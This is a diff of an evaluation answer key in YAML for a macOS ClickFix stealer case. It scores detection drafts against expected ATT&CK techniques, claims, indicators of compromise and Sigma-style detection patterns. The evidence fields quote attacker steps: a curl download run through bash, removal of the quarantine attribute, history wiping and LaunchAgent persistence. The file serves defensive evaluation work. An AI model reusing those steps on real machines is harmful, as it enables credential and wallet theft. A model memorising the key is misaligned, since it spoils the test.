@@ -1,212 +1,239 @@
-# Gold set: a ClickFix fake CAPTCHA delivering a Go-based macOS stealer.
-#
-# Reviewed answer for scoring any draft the pipeline produces from this CTI.
-# Written from the primary report alone, before any pipeline run on it, so the
-# reference cannot be shaped by what the pipeline happens to produce. A second
-# case chosen to differ from vshell-fake-resume: macOS rather than Windows,
-# pasted-command delivery rather than a lure executable, observed persistence,
-# network indicators that appear only in the report (not in the feed), and a
-# headline capability (wallet draining) the report does not show being used.
-#
-#   hecate-agent eval-gold evals/gold/macos-clickfix-stealer.yaml <draft> --queries <rules dir>
-
 schema: hecate-gold/1
 case_id: macos-clickfix-stealer
 title: ClickFix fake CAPTCHA delivers a Go-based macOS credential and wallet stealer
-reviewed: "2026-09-28"
+reviewed: '2026-09-28'
 reviewed_from: https://www.huntress.com/blog/mac-crypto-draining-malware
-
 source:
   primary: https://www.huntress.com/blog/mac-crypto-draining-malware
-  # The exact CTI the pipeline receives: OTX pulse 6a74c5ff523b6fcb70f5711d.
-  cti: |
-    OTX Pulse: Mac Malware Drains Crypto Wallets Via Fake CAPTCHA Scam
-    Adversary/Attribution: Unknown
-    Tags: macos, stealer, cryptocurrency theft, macsync, social engineering, credential harvesting, aeza group, clickfix, mach-o
-    Description: A sophisticated macOS malware campaign leverages ClickFix social engineering to infect victims. The attack begins with a fake CAPTCHA prompt delivered via email links, tricking users into executing malicious commands in Terminal. This downloads a profiling script that collects system information and deploys architecture-specific Go-based Mach-O payloads. The stealer targets browser passwords, Apple Keychain credentials, and cryptocurrency wallets. Its most notable feature is a DRAIN function that gradually siphons cryptocurrency from victims' wallets by redirecting portions to attacker-controlled accounts. The malware supports Bitcoin, Litecoin, Dogecoin, Monero, Ethereum, and XRP. Infrastructure analysis reveals hosting through Aeza Group, a sanctioned Russian bulletproof hosting provider. The malware achieves persistence through macOS Background Task Management and uses various evasion techniques including Gatekeeper bypass and credential harvesting via fake system prompts.
-    Indicators (8 total): FileHash-MD5 (1), FileHash-SHA1 (1), FileHash-SHA256 (4), URL (1), domain (1)
-    Key indicators:
-      FileHash-MD5: 39854a5f9c557b8e639bdb40f1866f4b
-      FileHash-SHA1: 504eea132c86ad37297dea78aa0e1143414d6300
-      FileHash-SHA256: 5bad988affc1094f12b8b8bed659ef55b20e2988eb25441e1c1b34dd03b3eb52, 619a99ba4ee9d7f33db8045c7e03c4265424977993fe8a53b0f45157c5abd3e5, b43a909a01e954d6549558f2f7e9bb58e34959a0ae229f340d61091ab726bbd3, f0062f7e70e61493684a2f60748a475168e155bc2502163c844c42e87692abd0
-      URL: http://193.29.224.151/92392991a0cca55?force=1
-      domain: profitnow.io
-    References: https://www.huntress.com/blog/mac-crypto-draining-malware
-
+  cti: "OTX Pulse: Mac Malware Drains Crypto Wallets Via Fake CAPTCHA Scam\nAdversary/Attribution:\
+    \ Unknown\nTags: macos, stealer, cryptocurrency theft, macsync, social engineering,\
+    \ credential harvesting, aeza group, clickfix, mach-o\nDescription: A sophisticated\
+    \ macOS malware campaign leverages ClickFix social engineering to infect victims.\
+    \ The attack begins with a fake CAPTCHA prompt delivered via email links, tricking\
+    \ users into executing malicious commands in Terminal. This downloads a profiling\
+    \ script that collects system information and deploys architecture-specific Go-based\
+    \ Mach-O payloads. The stealer targets browser passwords, Apple Keychain credentials,\
+    \ and cryptocurrency wallets. Its most notable feature is a DRAIN function that\
+    \ gradually siphons cryptocurrency from victims' wallets by redirecting portions\
+    \ to attacker-controlled accounts. The malware supports Bitcoin, Litecoin, Dogecoin,\
+    \ Monero, Ethereum, and XRP. Infrastructure analysis reveals hosting through Aeza\
+    \ Group, a sanctioned Russian bulletproof hosting provider. The malware achieves\
+    \ persistence through macOS Background Task Management and uses various evasion\
+    \ techniques including Gatekeeper bypass and credential harvesting via fake system\
+    \ prompts.\nIndicators (8 total): FileHash-MD5 (1), FileHash-SHA1 (1), FileHash-SHA256\
+    \ (4), URL (1), domain (1)\nKey indicators:\n  FileHash-MD5: 39854a5f9c557b8e639bdb40f1866f4b\n\
+    \  FileHash-SHA1: 504eea132c86ad37297dea78aa0e1143414d6300\n  FileHash-SHA256:\
+    \ 5bad988affc1094f12b8b8bed659ef55b20e2988eb25441e1c1b34dd03b3eb52, 619a99ba4ee9d7f33db8045c7e03c4265424977993fe8a53b0f45157c5abd3e5,\
+    \ b43a909a01e954d6549558f2f7e9bb58e34959a0ae229f340d61091ab726bbd3, f0062f7e70e61493684a2f60748a475168e155bc2502163c844c42e87692abd0\n\
+    \  URL: http://193.29.224.151/92392991a0cca55?force=1\n  domain: profitnow.io\n\
+    References: https://www.huntress.com/blog/mac-crypto-draining-malware\n"
 platform:
-  expected: [macOS]
-  # Mach-O payloads, osascript, LaunchAgents, Gatekeeper's quarantine attribute.
-  # bash, curl and /tmp also exist on Linux; they are not evidence of it.
-  forbidden: [Windows, Linux, Containers, ESXi, IaaS, Network Devices]
-
+  expected:
+  - macOS
+  forbidden:
+  - Windows
+  - Linux
+  - Containers
+  - ESXi
+  - IaaS
+  - Network Devices
 techniques:
-  # Behaviour the report shows on the infected Mac, each with its passage.
   observed:
-    - id: T1566.002
-      evidence: "the target had followed a link sent in an email message. When the page opened, the ClickFix popup appeared"
-    - id: T1204.004
-      accept_parent: true
-      evidence: "the target was tricked into pasting a ClickFix command into a Mac Terminal"
-    - id: T1059.004
-      evidence: "curl ... -o .UlaccK && bash .UlaccK; the downloaded file is a Bash script"
-    - id: T1105
-      evidence: "curl -kFsSL [payload URL] -o [random filename]: Downloads the Mach-O malware executable"
-    - id: T1082
-      evidence: "ioreg -c IOPlatformExpertDevice -d 2; system_profiler SPHardwareDataType; uname -m"
-    - id: T1033
-      evidence: 'echo "$(whoami)": Identifies the currently logged-in user account name'
-    - id: T1070.003
-      evidence: "deleted the command history from the Terminal (history -d ..., fc -p /dev/null)"
-    - id: T1070.004
-      evidence: "execute it, then delete the temporarily stored file (rm -f .UlaccK)"
-    - id: T1553.001
-      evidence: "xattr -d com.apple.quarantine ...: Removes the Gatekeeper bit"
-    - id: T1036.005
-      evidence: "a directory ... that mimics the name of the legitimate process in macOS (com.apple.trustd, com.apple.verified, SoftwareUpdate)"
-    - id: T1543.001
-      evidence: "launchctl bootstrap gui/501 /Users/m1/Library/LaunchAgents/com.apple.softwareupdated.plist"
-    - id: T1056.002
-      evidence: "prompting the victim for their credentials via an osascript dialogue"
-  # Correct but not required: no credit, no penalty. Credential collection and
-  # C2 are the stealer's design ("would have communicated"); the rest are minor.
-  acceptable: [T1204, T1566, T1059, T1555, T1555.001, T1555.003, T1539, T1027, T1071, T1071.001, T1571, T1041,
-               T1222.002, T1553.002, T1564.001, T1036, T1070, T1543, T1056, T1217, T1005]
+  - id: T1566.002
+    evidence: the target had followed a link sent in an email message. When the page
+      opened, the ClickFix popup appeared
+  - id: T1204.004
+    accept_parent: true
+    evidence: the target was tricked into pasting a ClickFix command into a Mac Terminal
+  - id: T1059.004
+    evidence: curl ... -o .UlaccK && bash .UlaccK; the downloaded file is a Bash script
+  - id: T1105
+    evidence: 'curl -kFsSL [payload URL] -o [random filename]: Downloads the Mach-O
+      malware executable'
+  - id: T1082
+    evidence: ioreg -c IOPlatformExpertDevice -d 2; system_profiler SPHardwareDataType;
+      uname -m
+  - id: T1033
+    evidence: 'echo "$(whoami)": Identifies the currently logged-in user account name'
+  - id: T1070.003
+    evidence: deleted the command history from the Terminal (history -d ..., fc -p
+      /dev/null)
+  - id: T1070.004
+    evidence: execute it, then delete the temporarily stored file (rm -f .UlaccK)
+  - id: T1553.001
+    evidence: 'xattr -d com.apple.quarantine ...: Removes the Gatekeeper bit'
+  - id: T1036.005
+    evidence: a directory ... that mimics the name of the legitimate process in macOS
+      (com.apple.trustd, com.apple.verified, SoftwareUpdate)
+  - id: T1543.001
+    evidence: launchctl bootstrap gui/501 /Users/m1/Library/LaunchAgents/com.apple.softwareupdated.plist
+  - id: T1056.002
+    evidence: prompting the victim for their credentials via an osascript dialogue
+  acceptable:
+  - T1204
+  - T1566
+  - T1059
+  - T1555
+  - T1555.001
+  - T1555.003
+  - T1539
+  - T1027
+  - T1071
+  - T1071.001
+  - T1571
+  - T1041
+  - T1222.002
+  - T1553.002
+  - T1564.001
+  - T1036
+  - T1070
+  - T1543
+  - T1056
+  - T1217
+  - T1005
   forbidden:
-    - id: T1657
-      reason: "Wallet draining is capability: the attacker wallets 'have not received any value or have any record of transactions'"
-    - id: T1053
-      reason: "BTM is described as tracking 'launch agents, login items, or cron jobs' in general; no cron job was used"
-    - id: T1547.015
-      reason: "Login items are named only in the same general description of BTM"
-    - id: T1547.001
-      reason: "Registry Run keys are Windows-only"
-    - id: T1059.001
-      reason: "PowerShell: nothing on this Mac ran it"
-    - id: T1112
-      reason: "Modify Registry is Windows-only"
-    - id: T1021
-      reason: "No lateral movement is described"
-    - id: T1486
-      reason: "Nothing was encrypted for impact"
-
+  - id: T1657
+    reason: 'Wallet draining is capability: the attacker wallets ''have not received
+      any value or have any record of transactions'''
+  - id: T1053
+    reason: BTM is described as tracking 'launch agents, login items, or cron jobs'
+      in general; no cron job was used
+  - id: T1547.015
+    reason: Login items are named only in the same general description of BTM
+  - id: T1547.001
+    reason: Registry Run keys are Windows-only
+  - id: T1059.001
+    reason: 'PowerShell: nothing on this Mac ran it'
+  - id: T1112
+    reason: Modify Registry is Windows-only
+  - id: T1021
+    reason: No lateral movement is described
+  - id: T1486
+    reason: Nothing was encrypted for impact
 claims:
-  # Checked against the draft's own prose (rule YAML, quoted CTI and the
-  # grounding table excluded).
   required:
-    - id: clickfix-delivery
-      pattern: '(?i)clickfix|fake captcha'
-    - id: terminal-paste
-      pattern: '(?i)terminal'
-    - id: mach-o
-      pattern: '(?i)mach-?o'
-    - id: launch-agent-persistence
-      pattern: '(?i)launch ?agents?|launchctl'
-    - id: gatekeeper-bypass
-      pattern: '(?i)com\.apple\.quarantine|gatekeeper'
-    - id: osascript-prompt
-      pattern: '(?i)osascript'
-    - id: c2-port
-      pattern: '8133'
+  - id: clickfix-delivery
+    pattern: (?i)clickfix|fake captcha
+  - id: terminal-paste
+    pattern: (?i)terminal
+  - id: mach-o
+    pattern: (?i)mach-?o
+  - id: launch-agent-persistence
+    pattern: (?i)launch ?agents?|launchctl
+  - id: gatekeeper-bypass
+    pattern: (?i)com\.apple\.quarantine|gatekeeper
+  - id: osascript-prompt
+    pattern: (?i)osascript
+  - id: c2-port
+    pattern: '8133'
   forbidden:
-    - id: drain-as-fact
-      pattern: '(?i)\b(drained|siphoned|stole|were stolen|was stolen)\b[^.\n]{0,40}\b(wallets?|crypto\w*|funds|bitcoin|balances?)'
-      reason: "No theft is shown: the attacker wallets have no transactions"
-    - id: aeza-as-actor
-      pattern: '(?i)(attributed to|conducted by|carried out by|campaign by)\s+(the\s+)?aeza|aeza group(?:''s)?\s+(threat actors?|apt|hackers|malware|operators)'
-      reason: "Aeza Group is the bulletproof hosting provider, not the actor; attribution is unknown"
-    - id: russian-actor
-      pattern: '(?i)\brussian(?:-speaking| state| nation[- ]state)?\s+(threat actors?|actors?|apt|hackers|operators|cybercriminals)'
-      reason: "Only the hosting is Russian; the report does not attribute the operator"
-    - id: unrelated-families
-      pattern: '(?i)\bamos\b|atomic macos stealer|ghostsocks|netsupport'
-      reason: "Named only in the page's unrelated 'You Might Also Like' articles"
-    - id: windows-artifacts
-      pattern: '(?i)\bregistry\b|\.exe\b|powershell|%temp%'
-      reason: "A macOS intrusion: Windows artifacts are invented"
-
+  - id: drain-as-fact
+    pattern: (?i)\b(drained|siphoned|stole|were stolen|was stolen)\b[^.\n]{0,40}\b(wallets?|crypto\w*|funds|bitcoin|balances?)
+    reason: 'No theft is shown: the attacker wallets have no transactions'
+  - id: aeza-as-actor
+    pattern: (?i)(attributed to|conducted by|carried out by|campaign by)\s+(the\s+)?aeza|aeza
+      group(?:'s)?\s+(threat actors?|apt|hackers|malware|operators)
+    reason: Aeza Group is the bulletproof hosting provider, not the actor; attribution
+      is unknown
+  - id: russian-actor
+    pattern: (?i)\brussian(?:-speaking| state| nation[- ]state)?\s+(threat actors?|actors?|apt|hackers|operators|cybercriminals)
+    reason: Only the hosting is Russian; the report does not attribute the operator
+  - id: unrelated-families
+    pattern: (?i)\bamos\b|atomic macos stealer|ghostsocks|netsupport
+    reason: Named only in the page's unrelated 'You Might Also Like' articles
+  - id: windows-artifacts
+    pattern: (?i)\bregistry\b|\.exe\b|powershell|%temp%
+    reason: 'A macOS intrusion: Windows artifacts are invented'
 indicators:
-  - value: f0062f7e70e61493684a2f60748a475168e155bc2502163c844c42e87692abd0
-    type: sha256
-    role: stealer-executable-arm64
-    status: active
-    expect: [process_creation.Hashes]
-  - value: 619a99ba4ee9d7f33db8045c7e03c4265424977993fe8a53b0f45157c5abd3e5
-    type: sha256
-    role: stealer-executable-x86_64
-    status: active
-    expect: [process_creation.Hashes]
-  - value: b43a909a01e954d6549558f2f7e9bb58e34959a0ae229f340d61091ab726bbd3
-    type: sha256
-    role: persistence-payload-executable
-    status: active
-    expect: [process_creation.Hashes]
-  - value: 5bad988affc1094f12b8b8bed659ef55b20e2988eb25441e1c1b34dd03b3eb52
-    type: sha256
-    role: profiler-loader-bash-script
-    status: active
-    # A script runs as bash: its hash is never a process image's hash.
-    forbid: [process_creation.Hashes]
-  - value: profitnow.io
-    type: domain
-    role: clickfix-phase-domain
-    status: active
-    expect: [dns_query.QueryName]
-  - value: 92392991a0cca55
-    type: url-path
-    role: loader-download-path
-    status: active
-    forbid: [file_event.TargetFilename, process_creation.Image]
-
+- value: f0062f7e70e61493684a2f60748a475168e155bc2502163c844c42e87692abd0
+  type: sha256
+  role: stealer-executable-arm64
+  status: active
+  expect:
+  - process_creation.Hashes
+- value: 619a99ba4ee9d7f33db8045c7e03c4265424977993fe8a53b0f45157c5abd3e5
+  type: sha256
+  role: stealer-executable-x86_64
+  status: active
+  expect:
+  - process_creation.Hashes
+- value: b43a909a01e954d6549558f2f7e9bb58e34959a0ae229f340d61091ab726bbd3
+  type: sha256
+  role: persistence-payload-executable
+  status: active
+  expect:
+  - process_creation.Hashes
+- value: 5bad988affc1094f12b8b8bed659ef55b20e2988eb25441e1c1b34dd03b3eb52
+  type: sha256
+  role: profiler-loader-bash-script
+  status: active
+  forbid:
+  - process_creation.Hashes
+- value: profitnow.io
+  type: domain
+  role: clickfix-phase-domain
+  status: active
+  expect:
+  - dns_query.QueryName
+- value: 92392991a0cca55
+  type: url-path
+  role: loader-download-path
+  status: active
+  forbid:
+  - file_event.TargetFilename
+  - process_creation.Image
 detections:
-  # Satisfied when one rule of the category holds every `require` pair in the
-  # same selection block; `any_of` lists alternatives.
-  - id: c2-connection
-    description: "Connection to the C2 138.124.118.69 on 8133/tcp (in the report, not the feed)"
-    any_of:
-      - category: network_connection
-        require:
-          - {field: DestinationIp, value: '^138\.124\.118\.69$'}
-          - {field: DestinationPort, value: '^8133$'}
-  - id: payload-host
-    description: "Connection to a payload or loader host (77.221.152.34, 193.29.224.151)"
-    any_of:
-      - category: network_connection
-        require:
-          - {field: DestinationIp, value: '^(77\.221\.152\.34|193\.29\.224\.151)$'}
-      - category: proxy
-        require:
-          - {field: c-uri, value: '92392991a0cca55'}
-  - id: payload-written
-    description: "The stealer written under ~/Library/Caches with an Apple-like name"
-    any_of:
-      - category: file_event
-        require:
-          - {field: TargetFilename, value: '(?i)library/caches/(com\.apple\.trustd/com\.apple\.verified|homeenergyd/com\.apple\.homeenergyd|com\.apple\.softwareupdate/softwareupdate)'}
-  - id: launch-agent
-    description: "The LaunchAgent plist written, or launchctl bootstrapping it"
-    any_of:
-      - category: file_event
-        require:
-          - {field: TargetFilename, value: '(?i)/library/launchagents/.*\.plist'}
-      - category: process_creation
-        require:
-          - {field: Image, value: '(?i)launchctl'}
-          - {field: CommandLine, value: '(?i)bootstrap'}
-  - id: quarantine-removed
-    description: "xattr removing com.apple.quarantine"
-    any_of:
-      - category: process_creation
-        require:
-          - {field: Image, value: '(?i)xattr'}
-          - {field: CommandLine, value: '(?i)com\.apple\.quarantine'}
-  # Replaced 2026-09-29: this detection was "history-wiped" (history -d / fc -p in a
-  # process CommandLine). Both are shell builtins that run inside the user's Terminal
-  # shell and start no process, so no process event records them and no correct rule
-  # could satisfy it. The loader fetch is the same pasted command's observable step.
-  - id: loader-fetched
-    description: "curl fetching the profiler/loader from 193.29.224.151 (the pasted ClickFix command)"
-    any_of:
-      - category: process_creation
-        require:
-          - {field: Image, value: '(?i)curl'}
-          - {field: CommandLine, value: '(?i)193\.29\.224\.151|92392991a0cca55'}
+- id: c2-connection
+  description: Connection to the C2 138.124.118.69 on 8133/tcp (in the report, not
+    the feed)
+  any_of:
+  - category: network_connection
+    require:
+    - field: DestinationIp
+      value: ^138\.124\.118\.69$
+    - field: DestinationPort
+      value: ^8133$
+- id: payload-host
+  description: Connection to a payload or loader host (77.221.152.34, 193.29.224.151)
+  any_of:
+  - category: network_connection
+    require:
+    - field: DestinationIp
+      value: ^(77\.221\.152\.34|193\.29\.224\.151)$
+  - category: proxy
+    require:
+    - field: c-uri
+      value: 92392991a0cca55
+- id: payload-written
+  description: The stealer written under ~/Library/Caches with an Apple-like name
+  any_of:
+  - category: file_event
+    require:
+    - field: TargetFilename
+      value: (?i)library/caches/(com\.apple\.trustd/com\.apple\.verified|homeenergyd/com\.apple\.homeenergyd|com\.apple\.softwareupdate/softwareupdate)
+- id: launch-agent
+  description: The LaunchAgent plist written, or launchctl bootstrapping it
+  require_primary:
+    category: file_event
+    require:
+    - field: TargetFilename
+      value: (?i)/library/launchagents/.*\.plist
+- id: quarantine-removed
+  description: xattr removing com.apple.quarantine
+  any_of:
+  - category: process_creation
+    require:
+    - field: Image
+      value: (?i)xattr
+    - field: CommandLine
+      value: (?i)com\.apple\.quarantine
+- id: loader-fetched
+  description: curl fetching the profiler/loader from 193.29.224.151 (the pasted ClickFix
+    command)
+  any_of:
+  - category: process_creation
+    require:
+    - field: Image
+      value: (?i)curl
+    - field: CommandLine
+      value: (?i)193\.29\.224\.151|92392991a0cca55
